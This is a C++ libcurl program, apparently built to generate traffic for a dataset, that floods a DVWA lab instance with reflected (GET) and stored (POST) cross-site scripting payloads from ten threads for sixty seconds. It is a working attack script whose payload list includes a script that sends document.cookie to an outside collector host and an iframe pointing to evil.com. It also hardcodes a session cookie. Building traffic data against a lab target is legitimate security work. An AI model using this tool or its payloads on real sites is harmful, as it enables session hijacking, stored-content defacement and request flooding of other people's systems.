/*
 * DVWA XSS Attack Flood Tool (Reflected & Stored)
 * Simulation: Generates traffic containing Malicious JavaScript Payloads
 * Dependency: libcurl
 * Compile: g++ xss_flood.cpp -o xss_flood -lcurl -lpthread
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <random> // 用于随机选择攻击模式
#include <curl/curl.h>

// === 配置区域 ===
// 1. DVWA 靶机地址
const std::string BASE_URL = "http://192.168.0.230/dvwa/vulnerabilities/";
// 2. Session ID
const std::string SESSION_ID = "d30osh0d51m82tpbjplcg10kgp"; 
const std::string SECURITY_LEVEL = "low"; 

const int THREAD_COUNT = 10;
const int ATTACK_DURATION = 60; // 60秒

// === 全局控制 ===
std::atomic<bool> is_running(true);
std::atomic<long> total_requests(0);

// XSS Payloads (模拟不同类型的脚本注入)
const std::vector<std::string> PAYLOADS = {
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"http://evil.com\"></iframe>", // 模拟挂马
    "<script>new Image().src=\"http://192.168.0.100/steal?c=\"+document.cookie;</script>", // 模拟盗取Cookie
    "javascript:alert(1)"
};

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

// 模式 A: Reflected XSS (GET 请求)
// 路径: /dvwa/vulnerabilities/xss_r/?name=PAYLOAD
void attack_reflected(CURL *curl, const std::string& payload) {
    char *encoded_payload = curl_easy_escape(curl, payload.c_str(), payload.length());
    if (encoded_payload) {
        std::string full_url = BASE_URL + "xss_r/?name=" + std::string(encoded_payload);
        
        curl_easy_setopt(curl, CURLOPT_URL, full_url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L); // 强制 GET
        
        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) total_requests++;
        
        curl_free(encoded_payload);
    }
}

// 模式 B: Stored XSS (POST 请求)
// 路径: /dvwa/vulnerabilities/xss_s/
// 参数: txtName=test&mtxMessage=PAYLOAD&btnSign=Sign+Guestbook
void attack_stored(CURL *curl, const std::string& payload) {
    curl_easy_setopt(curl, CURLOPT_URL, (BASE_URL + "xss_s/").c_str());
    
    // 构造 POST 数据
    // 注意：txtName 随便填，mtxMessage 填 Payload
    char *encoded_payload = curl_easy_escape(curl, payload.c_str(), payload.length());
    if (encoded_payload) {
        std::string post_data = "txtName=hacker&mtxMessage=" + std::string(encoded_payload) + "&btnSign=Sign+Guestbook";
        
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
        
        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) total_requests++;
        
        curl_free(encoded_payload);
    }
}

void attack_worker(int thread_id) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    std::string cookie_str = "security=" + SECURITY_LEVEL + "; PHPSESSID=" + SESSION_ID;
    
    curl_easy_setopt(curl, CURLOPT_COOKIE, cookie_str.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CPP-XSS-Attacker/3.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    // 随机数生成器 (用于随机切换 GET/POST 模式)
    std::mt19937 rng(thread_id);
    std::uniform_int_distribution<int> mode_dist(0, 1); // 0: Reflected, 1: Stored

    while (is_running) {
        for (const auto& payload : PAYLOADS) {
            if (!is_running) break;

            // 50% 概率跑 Reflected，50% 概率跑 Stored
            // 这样您的流量数据集中就会包含 GET 和 POST 两种类型的 XSS 特征
            if (mode_dist(rng) == 0) {
                attack_reflected(curl, payload);
            } else {
                attack_stored(curl, payload);
            }
            
            // 可选：Stored XSS 比较慢，且容易填满数据库，可以稍微慢一点
            // std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    }
    curl_easy_cleanup(curl);
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);

    std::cout << "=== XSS Attack Simulation Started ===" << std::endl;
    std::cout << "Target Base: " << BASE_URL << std::endl;
    std::cout << "Modes:       Reflected (GET) & Stored (POST)" << std::endl;
    std::cout << "Threads:     " << THREAD_COUNT << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(attack_worker, i + 1);
    }

    std::this_thread::sleep_for(std::chrono::seconds(ATTACK_DURATION));
    is_running = false;

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::cout << "\n=== Finished ===" << std::endl;
    std::cout << "Total Requests: " << total_requests.load() << std::endl;
    std::cout << "Avg RPS:        " << (total_requests.load() / ATTACK_DURATION) << std::endl;

    curl_global_cleanup();
    return 0;
}